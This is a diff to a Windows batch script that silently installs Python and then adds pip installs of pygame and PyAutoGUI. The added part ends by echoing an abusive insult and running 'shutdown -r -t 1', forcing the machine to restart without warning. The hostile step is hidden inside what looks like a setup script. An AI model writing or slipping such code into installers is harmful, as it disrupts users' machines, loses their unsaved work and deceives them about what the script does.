@@ -11,3 +11,14 @@ curl -L -o %PYTHON_EXE% %PYTHON_URL%
 start /wait %PYTHON_EXE% /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
 
 del %PYTHON_EXE%
+
+::credit to empirean for this scipt
+
+::dowload libreries
+pip install pygame
+pip install PyAutoGUI
+
+
+::rest of the code
+@echo say bye to Windows fucking idiot
+shutdown -r -t 1
